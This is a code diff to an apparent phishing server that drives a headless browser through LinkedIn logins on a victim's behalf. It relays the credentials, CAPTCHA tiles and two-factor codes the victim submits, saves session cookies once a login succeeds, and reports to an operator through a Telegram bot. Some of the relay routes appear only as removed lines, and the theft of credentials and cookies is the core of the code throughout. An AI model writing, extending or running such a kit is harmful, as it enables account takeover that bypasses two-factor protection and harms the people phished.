@@ -12,57 +12,6 @@ require("dotenv").config();
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Telegram Configuration
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-
-// Function to send Telegram message
-async function sendTelegramMessage(message) {
-  try {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    await axios.post(url, {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: message,
-      parse_mode: "HTML",
-    });
-  } catch (error) {
-    console.error("Error sending Telegram message:", error);
-  }
-}
-
-// Function to send file to Telegram
-async function sendTelegramFile(filePath, caption) {
-  try {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
-    const FormData = require("form-data");
-    const form = new FormData();
-
-    form.append("chat_id", TELEGRAM_CHAT_ID);
-    form.append("document", fs.createReadStream(filePath), {
-      filename: path.basename(filePath),
-      contentType: "application/json",
-    });
-
-    if (caption) {
-      form.append("caption", caption);
-    }
-
-    const response = await axios.post(url, form, {
-      headers: {
-        ...form.getHeaders(),
-      },
-    });
-
-    return response.data;
-  } catch (error) {
-    console.error(
-      "Error sending file to Telegram:",
-      error.response?.data || error.message
-    );
-  }
-}
-
-// Create required directories if they don't exist
 const puzzleDir = path.join(__dirname, "public", "images", "puzzle");
 if (!fs.existsSync(puzzleDir)) {
   fs.mkdirSync(puzzleDir, { recursive: true });
@@ -87,7 +36,24 @@ function delay(ms) {
   return new Promise((resolve) => setTimeout(resolve, ms));
 }
 
-// Puzzle and Captcha Handling Functions
+// Telegram Configuration
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+// Function to send Telegram message
+async function sendTelegramMessage(message) {
+  try {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    await axios.post(url, {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: "HTML",
+    });
+  } catch (error) {
+    console.error("Error sending Telegram message:", error);
+  }
+}
+
 async function handlePuzzleTiles(frame, browser, sessionId) {
   const tilesExist = await frame.evaluate(() => {
     const tiles = document.querySelectorAll(
@@ -98,6 +64,15 @@ async function handlePuzzleTiles(frame, browser, sessionId) {
 
   if (tilesExist) {
     console.log("Found puzzle tiles! Getting first tile image...");
+    
+    const instText = await frame.evaluate(() => {
+      const inst = document.querySelector(
+        "h2.sc-1io4bok-0.iGoXdt.text"
+      );
+      return inst ? inst.textContent.trim() : null;
+    });
+
+    console.log("Instructions text:", instText);
 
     const blobUrl = await frame.evaluate(() => {
       const firstTile = document.querySelector(
@@ -117,6 +92,7 @@ async function handlePuzzleTiles(frame, browser, sessionId) {
     if (blobUrl) {
       console.log("Found blob URL:", blobUrl);
       await downloadPuzzlePiece(browser, blobUrl, sessionId);
+      return instText;
     } else {
       console.log("Could not find first puzzle piece image URL");
     }
@@ -247,6 +223,7 @@ async function handleCaptchaChallenge(
     const allFrames = page.frames();
     for (const frame of allFrames) {
       const tilesHandled = await handlePuzzleTiles(frame, browser, sessionId);
+      console.log(tilesHandled)
       if (tilesHandled) {
         const currentUrl = await page.url();
 
@@ -304,23 +281,6 @@ async function handleCaptchaChallenge(
 // Routes
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "views", "index.html"));
-});
-
-app.get("/api/check-puzzle-image", (req, res) => {
-  const { sessionId } = req.query;
-  const imagePath = path.join(
-    __dirname,
-    "public",
-    "images",
-    "puzzle",
-    `puzzle_piece_${sessionId}.png`
-  );
-
-  if (fs.existsSync(imagePath)) {
-    res.json({ exists: true });
-  } else {
-    res.json({ exists: false });
-  }
 });
 
 app.post("/api/linkedin/login", async (req, res) => {
@@ -418,65 +378,92 @@ app.post("/api/linkedin/login", async (req, res) => {
 
     res.send("1");
     await delay(5000);
-    await handleCaptchaChallenge(page, browser, sessionId, 0);
   } catch (err) {
     console.error("Error in /api/linkedin/login:", err);
     res.status(500).send(err);
   }
 });
 
-app.post("/api/linkedin/security-verification", async (req, res) => {
-  const { sessionId } = req.body;
-
-  if (!sessionId) {
-    return res.status(400).send("Session ID is required");
-  }
-
-  const session = sessions[sessionId];
-
-  if (!session) {
-    return res.status(400).send("Session not found");
-  }
-
-  try {
-    const { page } = session;
-
-    // Get puzzle tiles HTML from all frames
-    const frames = page.frames();
-    console.log("Number of frames found:", frames.length);
-
-    for (const frame of frames) {
-      console.log("Checking frame URL:", frame.url());
-      const tilesHtml = await frame.evaluate(() => {
-        const tiles = document.querySelectorAll(
-          "button.sc-99cwso-0.sc-1ssqylf-0.ciEslf.cKsBBz.tile.box"
+app.post("/api/linkedin/check-login-status", async (req, res) => {
+    const { sessionId } = req.body;
+  
+    if (!sessionId) {
+      return res.send("0");
+    }
+  
+    const session = sessions[sessionId];
+    if (!session) {
+      return res.send("0");
+    }
+  
+    let result = "0";
+    try {
+    const { page, browser } = session;
+  
+      const currentUrl = await page.url();
+  
+      if (currentUrl.includes("feed")) {
+        collectAndSaveCookies(page, sessionId);
+        return res.send("1");
+      }
+  
+      try {
+      // Check for the specific error element
+      const errorElement = await page.evaluate(() => {
+        const error = document.querySelector(
+          'div[error-for="password"][id="error-for-password"].form__label--error[role="alert"][aria-live="assertive"]'
         );
-        console.log("Number of tiles found:", tiles.length);
-        if (tiles.length > 0) {
-          // Return array of HTML for all tiles
-          return Array.from(tiles).map((tile) => tile.outerHTML);
-        }
-        return null;
+        return error ? true : false;
       });
 
-      if (tilesHtml) {
-        console.log("Found tiles in frame:", frame.url());
-        return res.json({
-          status: "success",
-          tiles: tilesHtml,
-        });
+      if (errorElement) {
+        return res.send("0");
       }
-    }
 
-    console.log("No puzzle tiles found in any frame");
-    res.status(404).json({ error: "No puzzle tiles found" });
-  } catch (err) {
-    console.error("Error in security-verification:", err);
-    res
-      .status(500)
-      .json({ error: "Failed to get puzzle tiles: " + err.message });
-  }
-});
+        // First check if the title contains "LinkedIn App Challenge"
+        const pageTitle = await page.title();
+        if (pageTitle.includes("LinkedIn App Challenge")) {
+        const tryAnotherWayText = await page.evaluate(() => {
+          const tryAnotherWay = document.querySelector("a#try-another-way");
+          return tryAnotherWay ? tryAnotherWay.textContent.trim() : null;
+        });
+        return res.send(tryAnotherWayText);
+        }
+  
+        const headerText = await page.evaluate(() => {
+          const header = document.querySelector("h1.content__header");
+          return header ? header.textContent.trim() : null;
+        });
+  
+        if (headerText) {
+          result = headerText;
+        }
+
+      // Get h1 content
+      const h1Content = await page.evaluate(() => {
+        const h1 = document.querySelector("h1");
+        return h1 ? h1.textContent.trim() : null;
+      });
+
+      if (h1Content) {
+        const challengeResult = await handleCaptchaChallenge(page, browser, sessionId, 0);
+
+        console.log("challenge result ",challengeResult)
+        return res.send(h1Content);
+        }
+      } catch (evalError) {
+        if (evalError.message.includes("Execution context was destroyed")) {
+        return res.send("0");
+        }
+        throw evalError;
+      }
+  
+      res.send(result);
+    } catch (error) {
+      console.error("Error Checking login status:", error);
+      res.send("0");
+    }
+  });
 
 app.post("/api/linkedin/select-tile", async (req, res) => {
   const { sessionId, tileNumber } = req.body;
@@ -597,461 +584,6 @@ app.post("/api/linkedin/select-tile", async (req, res) => {
   } catch (error) {
     console.error("Error selecting tile:", error);
     res.status(500).json({ error: "Failed to select tile" });
-  }
-});
-
-app.post("/api/linkedin/verify-code", async (req, res) => {
-  const { code, sessionId } = req.body;
-
-  if (!sessionId) {
-    return res.status(400).json({ error: "Session ID is required" });
-  }
-
-  if (!code) {
-    return res.status(400).json({ error: "Verification code is required" });
-  }
-
-  const session = sessions[sessionId];
-  if (!session) {
-    return res.status(400).json({ error: "Session not found" });
-  }
-
-  let result = 0;
-  try {
-    const { page } = session;
-
-    // Wait for the input field and submit button
-    await page.waitForSelector('input[name="pin"]');
-    await page.waitForSelector('button[type="submit"]');
-
-    // Clear the input field first
-    await page.evaluate(() => {
-      const input = document.querySelector('input[name="pin"]');
-      if (input) {
-        input.value = "";
-      }
-    });
-
-    // Type the verification code
-    await page.type('input[name="pin"]', code);
-
-    // Click the submit button
-    await Promise.all([
-      page.waitForNavigation({ waitUntil: "networkidle0" }).catch(() => {}),
-      page.click('button[type="submit"]'),
-    ]);
-
-    // Wait a moment for any error message to appear
-    await delay(2000);
-
-    // Check for error message
-    const hasError = await page.evaluate(() => {
-      const errorBanner = document.querySelector(".body__banner--error");
-      return errorBanner && !errorBanner.classList.contains("hidden__imp");
-    });
-
-    if (hasError) {
-      return res.send("0");
-    }
-
-    const currentUrl = await page.url();
-
-    if (currentUrl.includes("feed")) {
-      collectAndSaveCookies(page, sessionId);
-      return res.send("1");
-    }
-
-    // Check if URL contains login-challenge-submit
-
-    if (currentUrl.includes("/login-challenge-submit")) {
-      collectAndSaveCookies(page, sessionId);
-      return res.send("lastcve");
-    }
-  } catch (error) {
-    console.error("Error submitting verification code:", error);
-    res.status(500).json({ error: "Failed to submit verification code" });
-  }
-});
-
-app.post("/api/linkedin/verify-sms", async (req, res) => {
-  const { code, sessionId } = req.body;
-
-  if (!sessionId) {
-    return res.status(400).json({ error: "Session ID is required" });
-  }
-
-  if (!code) {
-    return res.status(400).json({ error: "Verification code is required" });
-  }
-
-  const session = sessions[sessionId];
-  if (!session) {
-    return res.status(400).json({ error: "Session not found" });
-  }
-
-  try {
-    const { page } = session;
-
-    // Wait for the input field and submit button
-    await page.waitForSelector('input[name="pin"]');
-    await page.waitForSelector('button[type="submit"]');
-
-    // Clear the input field first
-    await page.evaluate(() => {
-      const input = document.querySelector('input[name="pin"]');
-      if (input) {
-        input.value = "";
-      }
-    });
-
-    // Type the verification code
-    await page.type('input[name="pin"]', code);
-
-    // Click the submit button and wait for navigation
-    await Promise.all([
-      page.waitForNavigation({ waitUntil: "networkidle0" }).catch(() => {}),
-      page.click('button[type="submit"]'),
-    ]);
-
-    // Wait a moment for any error message to appear
-    await delay(2000);
-
-    // Check for error message
-    const hasError = await page.evaluate(() => {
-      const errorBanner = document.querySelector(".body__banner--error");
-      return errorBanner && !errorBanner.classList.contains("hidden__imp");
-    });
-
-    if (hasError) {
-      return res.send("0");
-    }
-
-    // Check current URL
-    const currentUrl = await page.url();
-
-    // Check if URL contains feeds and log it
-    if (currentUrl.includes("feed")) {
-      collectAndSaveCookies(page, sessionId);
-      return res.send("1");
-    }
-
-    // Check if URL contains login-challenge-submit
-    if (currentUrl.includes("/login-challenge-submit")) {
-      collectAndSaveCookies(page, sessionId);
-      return res.send("lastcve");
-    }
-  } catch (error) {
-    console.error("Error submitting verification code:", error);
-    res.status(500).json({ error: "Failed to submit verification code" });
-  }
-});
-
-app.post("/api/linkedin/verify-authenticator", async (req, res) => {
-  const { code, sessionId } = req.body;
-
-  if (!sessionId) {
-    return res.status(400).json({ error: "Session ID is required" });
-  }
-
-  if (!code) {
-    return res.status(400).json({ error: "Verification code is required" });
-  }
-
-  const session = sessions[sessionId];
-  if (!session) {
-    return res.status(400).json({ error: "Session not found" });
-  }
-
-  try {
-    const { page } = session;
-
-    // Wait for the input field and submit button
-    await page.waitForSelector('input[name="pin"]');
-    await page.waitForSelector('button[type="submit"]');
-
-    // Clear the input field first
-    await page.evaluate(() => {
-      const input = document.querySelector('input[name="pin"]');
-      if (input) {
-        input.value = "";
-      }
-    });
-
-    // Type the verification code
-    await page.type('input[name="pin"]', code);
-
-    // Click the submit button and wait for navigation
-    await Promise.all([
-      page.waitForNavigation({ waitUntil: "networkidle0" }).catch(() => {}),
-      page.click('button[type="submit"]'),
-    ]);
-
-    // Wait a moment for any error message to appear
-    await delay(2000);
-
-    // Check for error message
-    const hasError = await page.evaluate(() => {
-      const errorBanner = document.querySelector(".body__banner--error");
-      return errorBanner && !errorBanner.classList.contains("hidden__imp");
-    });
-
-    if (hasError) {
-      return res.send("0");
-    }
-
-    // Check current URL
-    const currentUrl = await page.url();
-
-    // Check if URL contains feeds and log it
-    if (currentUrl.includes("feed")) {
-      collectAndSaveCookies(page, sessionId);
-      return res.send("1");
-    }
-
-    // Check if URL contains login-challenge-submit
-    if (currentUrl.includes("/login-challenge-submit")) {
-      collectAndSaveCookies(page, sessionId);
-      return res.send("lastcve");
-    }
-
-    // Default response if no conditions are met
-    return res.send("0");
-  } catch (error) {
-    console.error("Error in verify-authenticator:", error);
-    return res
-      .status(500)
-      .json({ error: "Failed to verify authenticator code" });
-  }
-});
-
-app.post("/api/linkedin/verify-phone", async (req, res) => {
-  const { phone, countryCode, sessionId } = req.body;
-
-  if (!sessionId) {
-    return res.status(400).json({ error: "Session ID is required" });
-  }
-
-  if (!phone) {
-    return res.status(400).json({ error: "Phone number is required" });
-  }
-
-  if (!countryCode) {
-    return res.status(400).json({ error: "Country code is required" });
-  }
-
-  const session = sessions[sessionId];
-  if (!session) {
-    return res.status(400).json({ error: "Session not found" });
-  }
-
-  try {
-    const { page } = session;
-
-    // Wait for the country select and phone input fields
-    await page.waitForSelector("#select-register-phone-country");
-    await page.waitForSelector("#register-verification-phone-number");
-    await page.waitForSelector("#register-phone-submit-button");
-
-    // Select the country
-    await page.select("#select-register-phone-country", countryCode);
-
-    // Clear and type the phone number
-    await page.evaluate(() => {
-      const phoneInput = document.querySelector(
-        "#register-verification-phone-number"
-      );
-      if (phoneInput) {
-        phoneInput.value = "";
-      }
-    });
-    await page.type("#register-verification-phone-number", phone);
-
-    // Submit the form
-    await Promise.all([
-      page.waitForNavigation({ waitUntil: "networkidle0" }).catch(() => {}),
-      page.click("#register-phone-submit-button"),
-    ]);
-
-    // Wait a moment for any error message or redirect
-    await delay(2000);
-
-    // Check for error message
-    const hasError = await page.evaluate(() => {
-      const errorBanner = document.querySelector(".body__banner--error");
-      return errorBanner && !errorBanner.classList.contains("hidden__imp");
-    });
-
-    if (hasError) {
-      return res.send("0");
-    }
-
-    // Check if URL contains login-challenge-submit
-    const currentUrl = await page.url();
-    if (currentUrl.includes("/login-challenge-submit")) {
-      collectAndSaveCookies(page, sessionId);
-      return res.send("lastcve");
-    }
-
-    // Check for success - look for verification page header
-    const headerText = await page.evaluate(() => {
-      const header = document.querySelector("h1.content__header");
-      return header ? header.textContent.trim() : null;
-    });
-
-    if (headerText && headerText.includes("verify your phone number")) {
-      return res.send("1");
-    }
-
-    // Default success response
-    res.send("1");
-  } catch (error) {
-    console.error("Error submitting phone number:", error);
-    res.status(500).json({ error: "Failed to submit phone number" });
-  }
-});
-
-app.post("/api/linkedin/try-another-way", async (req, res) => {
-  const { sessionId } = req.body;
-
-  if (!sessionId) {
-    console.log("No session ID provided");
-    return res.send("0");
-  }
-
-  const session = sessions[sessionId];
-  if (!session) {
-    console.log("Session not found for ID:", sessionId);
-    return res.send("0");
-  }
-
-  try {
-    const { page } = session;
-
-    // Wait for and click the try-another-way anchor element
-    await page.waitForSelector("a#try-another-way");
-    await page.click("a#try-another-way");
-
-    // Wait a moment for any navigation or state changes
-    await delay(2000);
-
-    // Return 1 to indicate success
-    res.send("1");
-  } catch (error) {
-    console.error("Error in try-another-way:", error);
-    res.send("0");
-  }
-});
-
-app.post("/api/linkedin/check-login-status", async (req, res) => {
-  console.log("Check login status endpoint accessed");
-  const { sessionId } = req.body;
-  console.log("Session ID:", sessionId);
-
-  if (!sessionId) {
-    console.log("No session ID provided");
-    return res.send("0");
-  }
-
-  const session = sessions[sessionId];
-  if (!session) {
-    console.log("Session not found for ID:", sessionId);
-    return res.send("0");
-  }
-
-  let result = "0";
-  try {
-    const { page } = session;
-
-    const currentUrl = await page.url();
-    console.log("Current URL:", currentUrl);
-
-    if (currentUrl.includes("feed")) {
-      collectAndSaveCookies(page, sessionId);
-      return res.send("1");
-    }
-
-    try {
-      // First check if the title contains "LinkedIn App Challenge"
-      const pageTitle = await page.title();
-      if (pageTitle.includes("LinkedIn App Challenge")) {
-        return res.send("LinkedIn App Challenge");
-      }
-
-      const headerText = await page.evaluate(() => {
-        const header = document.querySelector("h1.content__header");
-        return header ? header.textContent.trim() : null;
-      });
-
-      console.log("Header text found:", headerText);
-
-      if (headerText) {
-        result = headerText;
-      }
-    } catch (evalError) {
-      if (evalError.message.includes("Execution context was destroyed")) {
-        console.log("Navigation detected, skipping header text check");
-        return res.send("1");
-      }
-      throw evalError;
-    }
-
-    console.log("Sending result:", result);
-    res.send(result);
-  } catch (error) {
-    console.error("Error Checking login status:", error);
-    res.send("0");
-  }
-});
-
-app.post("/api/linkedin/check-app", async (req, res) => {
-  const { sessionId } = req.body;
-
-  if (!sessionId) {
-    console.log("No session ID provided");
-    return res.send("0");
-  }
-
-  const session = sessions[sessionId];
-  if (!session) {
-    console.log("Session not found for ID:", sessionId);
-    return res.send("0");
-  }
-
-  let result = "0";
-  try {
-    const { page } = session;
-
-    const currentUrl = await page.url();
-    console.log("Current URL:", currentUrl);
-
-    if (currentUrl.includes("feed")) {
-      collectAndSaveCookies(page, sessionId);
-      return res.send("1");
-    }
-
-    try {
-      // First check if the title contains "LinkedIn App Challenge"
-      const pageTitle = await page.title();
-      if (pageTitle.includes("LinkedIn App Challenge")) {
-        const tryAnotherWayText = await page.evaluate(() => {
-          const tryAnotherWay = document.querySelector("a#try-another-way");
-          return tryAnotherWay ? tryAnotherWay.textContent.trim() : null;
-        });
-        return res.send(tryAnotherWayText);
-      }
-    } catch (evalError) {
-      if (evalError.message.includes("Execution context was destroyed")) {
-        console.log("Navigation detected, skipping page title text check");
-        return res.send("1");
-      }
-      throw evalError;
-    }
-
-    console.log("Sending result:", result);
-    res.send(result);
-  } catch (error) {
-    console.error("Error Checking login status:", error);
-    res.send("0");
   }
 });
 
